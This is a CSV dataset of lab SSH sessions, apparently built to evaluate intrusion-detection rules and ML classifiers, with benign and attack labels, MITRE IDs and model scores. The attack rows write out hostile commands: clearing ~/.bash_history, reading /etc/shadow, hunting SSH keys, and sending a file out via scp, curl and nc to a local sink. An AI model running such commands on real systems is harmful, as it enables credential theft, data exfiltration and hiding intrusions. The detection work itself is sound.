session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,label,tactics,scenario,expected_rule_ids,mitre,source,split,persona,session_tag,composition,identity_is_synthetic,ip_is_synthetic,ts_is_synthetic,fail_ratio,commands_denied,fired_rule_ids,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil,new_source_ip_for_user,new_source_ip_globally,ip_foreign_to_user,distinct_source_ips_prior,distinct_source_ips_24h,source_ip_entropy,cmd_oov_rate,cmd_mean_surprisal,cmd_max_surprisal,cmd_mean_novelty,cmd_max_novelty,randomforest_score,randomforest_pred,lightgbm_score,lightgbm_pred
19fdc567ebf7410c000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:36:11.177+0000,2026-08-07T12:36:25.812+0000,14,False,False,False,"['cat file.txt | column -t', 'echo TAG:ben_auditor_478404', 'find /var -gid 100', 'find /home/user -type f -name ""report*""', 'find /home -regex "".*/[A-Z]{3}[0-9]{2}\\.csv""', 'ls /sys', ""cat file.csv | cut -d',' -f1"", 'ls -v', ""grep -i 'warning' server.log"", ""grep 'def' *.py"", ""grep 'exit' ~/.bash_history"", 'find /srv -path ""*/logs"" -prune -o -type f -print', 'ls -d /usr/local/*/', 'ls -itu', 'find /home -user alice', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",18,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_478404,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:36:11.177000+00:00,2026-08-07 12:36:25.812000+00:00,14.0,12,0,0,14,1.0,23.714285714285715,3.807354922057604,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.328425101167593,10.887152905558912,-9.516197353929911e-17,7.771561172376097e-16,0.02600378787878788,0,1.495788759868655e-07,0
19fdc56c10c064bd000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:36:28.233+0000,2026-08-07T12:36:39.567+0000,11,False,False,False,"['echo TAG:ben_admin_02d0f5', 'du -h --exclude=""*.bak"" /var', 'cd -P mylink', 'ls -laS', 'cd -P mylink', 'cd /var/spool', 'ls -d /.*', 'du --threshold=-100K', 'cd /var/cache', 'df -ih', 'ls -ld *', 'du -m', 'ls -laS', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",16,0,benign,[],admin,[],[],real,eval,admin,ben_admin_02d0f5,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:36:28.233000+00:00,2026-08-07 12:36:39.567000+00:00,11.0,12,0,0,12,0.8333333333333334,11.666666666666666,3.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,10.727014031444696,11.855444045831574,-1.8503717077085938e-17,3.3306690738754696e-16,0.0,0,1.4957887598668003e-07,0
19fdc56f5267ce7e000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:36:41.561+0000,2026-08-07T12:36:50.311+0000,8,False,False,False,"['echo TAG:ben_dev_dd522d', 'find /var -type f -links 1', 'find /var -type f -links 1', 'tail -n 20 file.txt', ""grep 'ssh' /var/log/messages"", ""awk '!/^#/ {print NR, $0}' file.txt"", ""grep -E 'error code [0-9]+' error.log"", 'tail -n 20 /var/log/syslog', 'find /home -inum 123456', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,benign,[],dev,[],[],real,eval,dev,ben_dev_dd522d,sampled,False,False,False,0.0,[],"[1002, 100500, 100502, 100503]",SSH,1,2026-08-07 12:36:41.561000+00:00,2026-08-07 12:36:50.311000+00:00,8.0,12,0,0,8,0.875,27.5,2.75,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.731935784366025,11.624118499725116,1.1102230246251563e-16,6.661338147750939e-16,0.0,0,1.3792732374733587e-07,0
19fdc5725c26890c000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:36:54.061+0000,2026-08-07T12:37:05.560+0000,11,False,False,False,"['echo TAG:ben_auditor_ff7176', ""grep '^INFO' log.txt"", ""grep '^#!/bin/bash' *.sh"", ""grep '^#!/bin/bash' *.sh"", 'find /data -mmin -60', ""grep '^#!/bin/bash' *.sh"", 'ls -U', ""grep -r 'ssh' ~"", 'ls -C', 'ls -C', 'ls -C', ""grep -E '^[0-9]+$' numbers.txt"", 'find /tmp -type p', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",16,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_ff7176,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:36:54.061000+00:00,2026-08-07 12:37:05.560000+00:00,11.0,12,0,0,12,0.6666666666666666,16.166666666666668,2.792481250360578,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.344120619833708,10.03915599900396,2.498001805406602e-16,1.1102230246251563e-15,0.0,0,1.4957887598667953e-07,0
19fdc575f104bbf8000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:37:08.560+0000,2026-08-07T12:37:19.559+0000,10,False,False,False,"['du -h --max-depth=1 /root', 'echo TAG:ben_dba_8bee95', 'du -h --max-depth=1 /root', 'du -h --max-depth=1 /root', 'du -k', 'du -ch', 'du -ch', 'find /var -mindepth 2 -type f', 'df -h --output=source,target', 'du -h --max-depth=1 /root', 'du -h --max-depth=1 /root', 'find /srv -size -10M -type f', 'du -c /var', 'du -B 8P', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",17,0,benign,[],dba,[],[],real,eval,dba,ben_dba_8bee95,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:37:08.560000+00:00,2026-08-07 12:37:19.559000+00:00,10.0,12,0,0,13,0.6153846153846154,18.846153846153847,2.6535442970305683,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.991545418001788,11.334611882530131,-8.540177112501206e-18,3.3306690738754696e-16,0.0,0,1.4337225707192014e-07,0
19fdc579695dafa8000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:37:22.810+0000,2026-08-07T12:37:34.309+0000,11,False,False,False,"['tail -c 100 file.txt', 'echo TAG:ben_dev_9d7adf', ""grep -E '([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}' logfile.txt"", 'tail -c 100 file.txt', 'cat -n file.txt', 'find /home -newer file.txt', ""grep -E '([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}' logfile.txt"", 'find /data -mmin -60', 'find /home -newer file.txt', ""grep 'error' log.txt"", 'cd /tmp && ls -la', 'tail -c 100 file.txt', ""grep 'function' *.js"", ""grep '^$' file.txt"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",17,0,benign,[],dev,[],[],real,eval,dev,ben_dev_9d7adf,sampled,False,False,False,0.0,[],"[1002, 100500, 100502, 100503]",SSH,1,2026-08-07 12:37:22.810000+00:00,2026-08-07 12:37:34.309000+00:00,11.0,12,0,0,13,0.6923076923076923,26.307692307692307,3.0269868333592878,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0769230769230769,10.080832148008708,16.379006001888587,0.0113175425618576,0.1471280533041518,0.9689999999999999,1,0.9999979499965211,1
19fdc57cd978621b000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:37:36.962+0000,2026-08-07T12:37:46.559+0000,9,False,False,False,"['echo TAG:ben_dev_4eedbb', 'find /var/log -mtime -1', 'find /var/log -mtime -1', ""awk '!/^#/ {print NR, $0}' file.txt"", ""awk '!/^#/ {print NR, $0}' file.txt"", 'find /var/log -mtime -1', 'find /var/log -mtime -1', 'awk \'$2 == ""admin""\' users.txt', ""awk '{print $2, $0}' file.txt | sort -n"", ""grep 'alias' ~/.bashrc"", ""awk '{print $1}' data.txt"", 'find /tmp -size -100c', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],dev,[],[],real,eval,dev,ben_dev_4eedbb,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:37:36.962000+00:00,2026-08-07 12:37:46.559000+00:00,9.0,12,0,0,11,0.6363636363636364,27.09090909090909,2.550340709546388,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.543437985162026,10.112219461193686,2.422304781000341e-16,6.661338147750939e-16,0.0,0,1.3792732374734053e-07,0
19fdc580128291cc000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:37:50.059+0000,2026-08-07T12:38:07.307+0000,16,False,False,False,"['cd /var/log/lightdm', 'echo TAG:atk_recon_cd8040', 'cd /var/log/lightdm', 'du -k /usr', 'id', 'cd /var/log/lightdm', 'cd /var/log/boot.log', 'ls ~/Documents', 'cd /var/log/lightdm', 'du -B 2M', 'ps aux', 'du -h --exclude=""*.so"" /usr', 'cd /var/log/boot.log', 'ls ~/Documents', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",17,0,attack,['recon'],recon,[100518],"['T1082', 'T1087']",real,eval,,atk_recon_cd8040,minimal,False,False,False,0.0,[],"[100500, 100502, 100503, 100518]",SSH,1,2026-08-07 12:37:50.059000+00:00,2026-08-07 12:38:07.307000+00:00,16.0,12,0,0,13,0.6153846153846154,15.153846153846152,2.7773627950641693,0,0,0,0,1,0,0,0,0,1,1,0.0,0.1538461538461538,11.459753308211509,16.379006001888587,0.0672568907436493,0.7704782084677095,1.0,1,0.9999998162630228,1
19fdc584c697e197000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:38:09.558+0000,2026-08-07T12:38:12.807+0000,3,False,False,False,"['cat /dev/null > ~/.bash_history', 'echo TAG:atk_log_tamper_0054f3', 'awk \'$1 == ""ERROR"" {print $2}\' log.txt', ""grep 'exit' ~/.bash_history"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",7,0,attack,['log_tamper'],log_tamper,[100516],"['T1070', 'T1562']",real,eval,,atk_log_tamper_0054f3,diluted,False,False,False,0.0,[],"[1002, 100500, 100502, 100503]",SSH,1,2026-08-07 12:38:09.558000+00:00,2026-08-07 12:38:12.807000+00:00,3.0,12,0,0,3,1.0,32.0,1.584962500721156,0,0,0,0,0,0,0,0,0,1,1,0.0,0.3333333333333333,11.594279169606033,16.379006001888587,0.0770698896571773,0.2312096689715312,0.9100714285714286,1,0.999999202384773,1
19fdc586300ad7c7000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:38:15.106+0000,2026-08-07T12:38:23.058+0000,7,False,False,False,"['echo TAG:ben_dev_e8351a', ""grep 'eth0' /var/log/syslog"", ""grep 'eth0' /var/log/syslog"", 'find /var -not -name ""*.gz"" -a -type f', ""grep -r 'password' /etc"", 'cat /dev/urandom | head -c 16', 'cat /proc/cpuinfo', 'cat /dev/urandom | head -c 16', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",11,0,benign,[],dev,[],[],real,eval,dev,ben_dev_e8351a,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:38:15.106000+00:00,2026-08-07 12:38:23.058000+00:00,7.0,12,0,0,7,0.7142857142857143,27.142857142857142,2.235926350629033,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,8.867950330427208,9.302190404837756,1.9032394707859823e-16,5.551115123125784e-16,0.0,0,1.3792732374731676e-07,0
19fdc588e214c664000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:38:26.307+0000,2026-08-07T12:38:28.307+0000,1,False,False,False,"['echo TAG:atk_log_tamper_76444f', 'ln -sf /dev/null ~/.bash_history', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,attack,['log_tamper'],log_tamper,[100516],"['T1070', 'T1562']",real,eval,,atk_log_tamper_76444f,full,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:38:26.307000+00:00,2026-08-07 12:38:28.307000+00:00,1.0,12,0,0,1,1.0,32.0,-0.0,0,0,0,0,0,0,0,0,0,1,1,0.0,1.0,16.379006001888587,16.379006001888587,0.2281639782272455,0.2281639782272455,0.9606875000000001,1,0.999999202384773,1
19fdc58a2238e934000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:38:31.306+0000,2026-08-07T12:38:36.306+0000,4,False,False,False,"[""echo 'test-data-atk_exfil_92486e' > /tmp/exfil_test_atk_exfil_92486e.txt"", 'echo TAG:atk_exfil_92486e', 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_92486e.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_92486e.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_92486e.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_92486e.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,attack,['exfil'],exfil,[100520],"['T1048', 'T1041']",real,eval,,atk_exfil_92486e,full,False,False,False,0.0,[],"[100500, 100502, 100503, 100520]",SSH,1,2026-08-07 12:38:31.306000+00:00,2026-08-07 12:38:36.306000+00:00,4.0,12,0,0,5,1.0,86.2,2.321928094887362,0,0,0,0,0,1,0,0,0,1,1,0.0,1.0,16.379006001888587,16.379006001888587,0.607585249309637,0.7040080759440137,1.0,1,0.9999998007807188,1
19fdc58c0073c147000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:38:38.923+0000,2026-08-07T12:38:47.806+0000,8,False,False,False,"['echo TAG:ben_dev_e475dd', 'find /tmp -perm 644', ""grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' access.log"", 'find /data -type f -newermt ""2025-06-10""', ""grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' access.log"", ""awk '{print NR, $0}' file.txt"", ""grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' access.log"", ""grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' access.log"", ""grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' access.log"", 'find /home -not -path ""*/.cache/*""', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,benign,[],dev,[],[],real,eval,dev,ben_dev_e475dd,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:38:38.923000+00:00,2026-08-07 12:38:47.806000+00:00,8.0,12,0,0,9,0.5555555555555556,41.888888888888886,1.879964948727111,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,8.575528243388172,9.969615065750885,-3.7007434154171886e-16,2.220446049250313e-16,0.0,0,1.3792732374735082e-07,0
19fdc58f00b247d3000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:38:51.307+0000,2026-08-07T12:38:55.806+0000,4,False,False,False,"['echo TAG:ben_dba_5fd0ff', ""grep -E '\\b[\\w.-]+@[\\w.-]+\\.[A-Za-z]{2,6}\\b' *.txt"", ""grep -E '\\b[\\w.-]+@[\\w.-]+\\.[A-Za-z]{2,6}\\b' *.txt"", ""grep -E '\\b[\\w.-]+@[\\w.-]+\\.[A-Za-z]{2,6}\\b' *.txt"", ""grep -E '\\b[\\w.-]+@[\\w.-]+\\.[A-Za-z]{2,6}\\b' *.txt"", ""grep -E '\\b[\\w.-]+@[\\w.-]+\\.[A-Za-z]{2,6}\\b' *.txt"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,benign,[],dba,[],[],real,eval,dba,ben_dba_5fd0ff,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:38:51.307000+00:00,2026-08-07 12:38:55.806000+00:00,4.0,12,0,0,5,0.2,50.0,-0.0,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,8.184249147466339,8.184249147466339,0.0,0.0,0.0,0,1.3792732374733806e-07,0
19fdc59093c05fd4000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:38:57.662+0000,2026-08-07T12:39:06.305+0000,8,False,False,False,"['du -b', 'echo TAG:atk_recon_7293fa', 'find /tmp -not -newer /tmp/marker', 'netstat -tulnp', 'find /data -mindepth 4 -type d', 'du -B 4T', 'du -ah | sort -hr', 'du -h --max-depth=1 /opt', ""df -h | grep '/home'"", 'df -h', 'df -ih', 'df -ih', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,attack,['recon'],recon,[100518],"['T1082', 'T1087']",real,eval,,atk_recon_7293fa,minimal,False,False,False,0.0,[],"[100500, 100502, 100503, 100518]",SSH,1,2026-08-07 12:38:57.662000+00:00,2026-08-07 12:39:06.305000+00:00,8.0,12,0,0,11,0.9090909090909092,15.272727272727272,3.277613436819116,0,0,0,0,1,0,0,0,0,1,1,0.0,0.0909090909090909,10.692593461659945,16.379006001888587,0.0650936447550837,0.7160300923059226,0.99875,1,0.9999997483311482,1
19fdc5938c92586e000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:39:09.948+0000,2026-08-07T12:39:17.305+0000,7,False,False,False,"['echo TAG:atk_log_tamper_945fc1', 'sudo ls -la /var/log/', 'sudo cat /var/log/auth.log 2>/dev/null | tail -20', 'find /data -user root -a -group root', 'cat /dev/urandom | head -c 16', 'find /srv -name ""*.log"" -a -size +10M', 'history -c', ""awk 'max < $3 {max=$3} END {print max}' file.txt"", 'last', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,attack,['log_tamper'],log_tamper,[100516],"['T1070', 'T1562']",real,eval,,atk_log_tamper_945fc1,diluted,False,False,False,0.25,"['sudo ls -la /var/log/', 'sudo cat /var/log/auth.log 2>/dev/null | tail -20']","[100500, 100502, 100503, 100516, 100518]",SSH,1,2026-08-07 12:39:09.948000+00:00,2026-08-07 12:39:17.305000+00:00,7.0,12,0,0,8,1.0,29.25,3.0,0,0,0,1,1,0,0,0,0,1,1,0.0,0.375,11.642215143412445,16.379006001888587,0.163284922361502,0.5134434321162373,0.9984999999999999,1,0.9999997773293777,1
19fdc595f74531f8000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:39:19.807+0000,2026-08-07T12:39:28.805+0000,8,False,False,False,"['echo TAG:ben_admin_8f3fbb', ""df -hT | grep 'ext4'"", ""df -hT | grep 'ext4'"", 'cd /usr/share/themes', 'cd /usr/share/themes', 'cd /usr/share/themes', ""df -hT | grep 'ext4'"", ""df -hT | grep 'ext4'"", 'cd /usr/share/doc', ""df -hT | grep 'ext4'"", 'cd /usr/share/themes', 'ls *.txt', 'free -m -t', 'ls -ltr ~/Documents', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",17,0,benign,[],admin,[],[],real,eval,admin,ben_admin_8f3fbb,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:39:19.807000+00:00,2026-08-07 12:39:28.805000+00:00,8.0,12,0,0,13,0.4615384615384615,18.0,2.1920058354921066,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,10.338081799123284,11.334611882530131,7.686159401251084e-17,4.440892098500626e-16,0.0,0,1.3792732374733806e-07,0
19fdc598f73c8377000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:39:32.023+0000,2026-08-07T12:39:35.554+0000,3,False,False,False,"['echo TAG:ben_admin_0960f3', 'cd -L mylink', 'du -a', 'du -B 8P', 'cd /var/log/fsck', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,benign,[],admin,[],[],real,eval,admin,ben_admin_0960f3,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:39:32.023000+00:00,2026-08-07 12:39:35.554000+00:00,3.0,12,0,0,4,1.0,10.25,2.0,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,11.635347039758512,12.678566283747497,8.326672684688674e-17,5.551115123125784e-16,0.0,0,1.3792732374734174e-07,0
19fdc59aa6279bd8000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:39:39.055+0000,2026-08-07T12:39:43.554+0000,4,False,False,False,"['echo TAG:atk_cred_access_d055e1', 'sudo cat /etc/shadow', 'sudo find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,attack,['cred_access'],cred_access,[100510],"['T1003', 'T1552']",real,eval,,atk_cred_access_d055e1,full,False,False,False,0.5,"['sudo cat /etc/shadow', 'sudo find /root /home /etc -name id_rsa 2>/dev/null']","[100500, 100502, 100503, 100510, 100514]",SSH,1,2026-08-07 12:39:39.055000+00:00,2026-08-07 12:39:43.554000+00:00,4.0,12,0,0,4,1.0,43.75,2.0,1,0,1,0,0,0,0,0,0,1,1,0.0,1.0,16.379006001888587,16.379006001888587,0.4775161471806052,0.5923887606700814,0.9979166666666667,1,0.9999997994837768,1
